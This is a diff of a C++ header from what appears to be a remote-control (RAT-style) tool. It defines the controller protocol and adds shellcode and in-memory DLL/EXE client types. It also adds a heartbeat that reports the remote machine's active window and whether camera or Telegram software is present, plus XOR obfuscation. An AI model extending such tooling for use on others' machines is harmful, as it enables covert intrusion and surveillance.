@@ -68,9 +68,9 @@ typedef void* LPVOID, * HANDLE;
 
 // 以下2个数字需全局唯一，否则在生成服务时会出问题
 
-#define FLAG_FINDEN 0x1234567
+#define FLAG_FINDEN "Hello, World!"
 
-#define FLAG_GHOST	0x7654321
+#define FLAG_GHOST	FLAG_FINDEN
 
 // 当程序功能明显发生变化时，应该更新这个值，以便对被控程序进行区分
 #define DLL_VERSION __DATE__		// DLL版本
@@ -202,43 +202,84 @@ enum
 
 	SOCKET_DLLLOADER=210,           // 客户端请求DLL
 	CMD_DLLDATA,                    // 响应DLL数据
+	CMD_MASTERSETTING = 215,		// 主控设置
+	CMD_HEARTBEAT_ACK = 216,		// 心跳回应
 };
 
-#define CLIENT_TYPE_DLL			0	// 客户端代码以DLL运行
-#define CLIENT_TYPE_ONE			1	// 客户端代码以单个EXE运行
-#define CLIENT_TYPE_MODULE		2	// DLL需由外部程序调用
+enum 
+{
+	CLIENT_TYPE_DLL = 0,			// 客户端代码以DLL运行
+	CLIENT_TYPE_ONE = 1,			// 客户端代码以单个EXE运行
+	CLIENT_TYPE_MEMEXE = -1,		// 内存EXE运行
+	CLIENT_TYPE_MODULE = 2,			// DLL需由外部程序调用
+	CLIENT_TYPE_SHELLCODE = 4,		// Shellcode
+	CLIENT_TYPE_MEMDLL = 5,			// 内存DLL运行
+	CLIENT_TYPE_LINUX = 6,			// LINUX 客户端
+};
+
+inline const char* GetClientType(int typ) {
+	switch (typ)
+	{
+	case CLIENT_TYPE_DLL:
+		return "DLL";
+	case CLIENT_TYPE_ONE:
+		return "EXE";
+	case CLIENT_TYPE_MEMEXE:
+		return "MEXE";
+	case CLIENT_TYPE_MODULE:
+		return "DLL";
+	case CLIENT_TYPE_SHELLCODE:
+		return "SC";
+	case CLIENT_TYPE_MEMDLL:
+		return "MDLL";
+	case CLIENT_TYPE_LINUX:
+		return "LNX";
+	default:
+		return "DLL";
+	}
+}
 
 // 所连接的主控程序信息
 typedef struct CONNECT_ADDRESS
 {
 public:
-	unsigned long	dwFlag;
-	char			szServerIP[_MAX_PATH];
-	int				iPort;
+	char	        szFlag[32];
+	char			szServerIP[100];
+	char			szPort[8];
 	int				iType;
+	bool            bEncrypt;
+	char            szBuildDate[12];
+	int             iMultiOpen;
+	char            szReserved[134]; // 占位，使结构体占据300字节
 
 public:
 	void SetType(int typ) {
 		iType = typ;
 	}
-	const unsigned long & Flag() const {
-		return dwFlag;
+	const void* Flag() const {
+		return szFlag;
+	}
+	int FlagLen() const {
+		return strlen(szFlag);
 	}
 	const char* ServerIP()const {
 		return szServerIP;
 	}
 	int ServerPort()const {
-		return iPort;
+		return atoi(szPort);
 	}
 	int ClientType()const {
 		return iType;
 	}
 	void SetServer(const char* ip, int port) {
 		strcpy_s(szServerIP, ip);
-		iPort = port;
+		sprintf_s(szPort, "%d", port);
 	}
 	bool IsValid()const {
-		return strlen(szServerIP) != 0 && iPort > 0;
+		return strlen(szServerIP) != 0 && atoi(szPort) > 0;
+	}
+	int Size() const {
+		return sizeof(CONNECT_ADDRESS);
 	}
 } CONNECT_ADDRESS ;
 
@@ -269,6 +310,67 @@ typedef struct  LOGIN_INFOR
 		return *this;
 	}
 }LOGIN_INFOR;
+
+// 固定1024字节
+typedef struct Heartbeat
+{
+	uint64_t Time;
+	char ActiveWnd[512];
+	int Ping;
+	int HasSoftware;
+	char Reserved[496];
+
+	Heartbeat() {
+		memset(this, 0, sizeof(Heartbeat));
+	}
+	Heartbeat(const std::string& s, int ping = 0) {
+		auto system_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(
+			std::chrono::system_clock::now()
+			);
+		Time = system_ms.time_since_epoch().count();
+		strcpy_s(ActiveWnd, s.c_str());
+		Ping = ping;
+		memset(Reserved, 0, sizeof(Reserved));
+	}
+	int Size() const {
+		return sizeof(Heartbeat);
+	}
+}Heartbeat;
+
+typedef struct HeartbeatACK {
+	uint64_t Time;
+	char Reserved[24];
+}HeartbeatACK;
+
+// 固定500字节
+typedef struct MasterSettings {
+	int         ReportInterval;             // 上报间隔
+	int         Is64Bit;                    // 主控是否64位
+	char        MasterVersion[12];          // 主控版本
+	int			DetectSoftware;				// 检测软件
+	char        Reserved[476];              // 预留
+}MasterSettings;
+
+enum 
+{
+	SOFTWARE_CAMERA = 0,
+	SOFTWARE_TELEGRAM,
+
+	SHELLCODE = 0,
+	MEMORYDLL = 1,
+};
+
+typedef DWORD(__stdcall* PidCallback)(void);
+
+inline const char* EVENTID(PidCallback pid) {
+	static char buf[64] = { 0 };
+	if (buf[0] == 0) {
+		sprintf_s(buf, "SERVICE [%d] FINISH RUNNING", pid());
+	}
+	return buf;
+}
+
+#define EVENT_FINISHED EVENTID(GetCurrentProcessId)
 
 inline void xor_encrypt_decrypt(unsigned char *data, int len, const std::vector<char>& keys) {
 	for (char key : keys) {
